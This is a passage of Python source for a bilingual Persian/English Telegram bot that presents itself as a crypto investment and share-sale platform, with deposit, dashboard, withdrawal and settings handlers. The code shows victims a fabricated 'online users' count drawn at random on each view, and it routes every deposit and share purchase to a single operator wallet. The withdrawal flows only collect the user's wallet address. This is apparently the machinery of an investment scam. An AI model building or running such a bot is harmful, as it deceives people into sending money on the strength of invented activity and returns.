            else "✅ **حساب کاربری شما با موفقیت و بالاترین سطح امنیت ساخته شد!**\n\n"
            "🗝 **عبارت بازیابی ۱۵ کلمه‌ای شما (Seed Phrase):**\n"
            f"`{seed_phrase}`\n\n"
            "⚠️ **هشدار مهم:** این ۱۵ کلمه را در جای امن یادداشت کنید. اگر روزی رمز عبورتان را فراموش کردید، با این کلمات می‌توانید حساب خود را بازیابی کنید!"
        )
        
        users, capital, _ = get_global_stats()
        welcome_msg = get_text(lang, "welcome", online=str(random.randint(3100,4500)), users=f"{users:,}", capital=capital)
        
        await message.answer(success_msg, parse_mode="Markdown")
        await message.answer(welcome_msg, reply_markup=get_main_menu(lang), parse_mode="Markdown")

@dp.callback_query(F.data == "change_lang")
async def ch_lang(callback: CallbackQuery):
    text = "🌍 **Select Language / انتخاب زبان:**"
    await callback.message.edit_text(text, reply_markup=get_language_menu(), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "deposit")
async def dep(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    random.seed(uid + int(datetime.now().strftime("%Y%m%d")))
    offset = random.randint(1, 40) / 100.0
    sample_val = 12 + offset
    await callback.message.edit_text(get_text(lang, "deposit_text", sample=f"{sample_val:.2f}", wallet=MY_WALLET_ADDRESS), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "dashboard")
async def dash(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    dep_val, prof, shares, uname = get_user_data(uid)
    await callback.message.edit_text(get_text(lang, "dashboard_text", uname=uname or "User", uid=uid, dep=dep_val, prof=prof, shares=shares, total=dep_val+prof), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "buy_shares")
async def shares(callback: CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    _, _, sold = get_global_stats()
    await callback.message.edit_text(get_text(lang, "shares_text", price=SHARE_PRICE, rem=10000000-sold, wallet=MY_WALLET_ADDRESS), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "withdraw_menu")
async def withdraw_menu(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    dep_val, prof, _, _ = get_user_data(uid)
    total_bal = dep_val + prof
    
    t = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_fast_wd"], callback_data="wd_fast")],
        [InlineKeyboardButton(text=t["btn_norm_wd"], callback_data="wd_norm")],
        [InlineKeyboardButton(text=t["back"], callback_data="back_to_menu")]
    ])
    
    text = get_text(lang, "withdraw_menu", dep=dep_val, prof=prof, total=total_bal)
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "wd_fast")
async def wd_fast(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    dep_val, prof, _, _ = get_user_data(uid)
    
    if (dep_val + prof) <= 0:
        await callback.answer(get_text(lang, "withdraw_low"), show_alert=True)
        return

    user_states[uid] = {"step": "get_withdrawal_wallet", "wd_type": "fast", "language": lang}
    await callback.message.edit_text(get_text(lang, "ask_wallet"), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "wd_norm")
async def wd_norm(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    dep_val, prof, _, _ = get_user_data(uid)
    
    if (dep_val + prof) <= 0:
        await callback.answer(get_text(lang, "withdraw_low"), show_alert=True)
        return

    user_states[uid] = {"step": "get_withdrawal_wallet", "wd_type": "norm", "language": lang}
    await callback.message.edit_text(get_text(lang, "ask_wallet"), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "edit_settings")
async def edit_settings(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = get_user_language(uid)
    user_states[uid] = {"step": "get_username", "language": lang, "is_editing": True}
    
    prompt = "⚙️ **Edit Credentials**\n\nEnter your new **Username**:" if lang == "en" else "⚙️ **ویرایش حساب کاربری**\n\nلطفاً نام کاربری جدید خود را وارد کنید:"
    await callback.message.edit_text(prompt, reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "support")
async def supp(callback: CallbackQuery):
    lang = get_user_language(callback.from_user.id)
    await callback.message.edit_text(get_text(lang, "support_text"), reply_markup=get_back_menu(lang), parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "back_to_menu")
async def bk(callback: CallbackQuery):
    uid = callback.from_user.id
    if uid in user_states:
        del user_states[uid]
    lang = get_user_language(uid)
    users, capital, _ = get_global_stats()
    msg = get_text(lang, "welcome", online=str(random.randint(3100,4500)), users=f"{users:,}", capital=capital)
    await callback.message.edit_text(msg, reply_markup=get_main_menu(lang), parse_mode="Markdown")
    await callback.answer()

init_db()
print("Bot is running with Invite Friends section and Referral tracking!")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
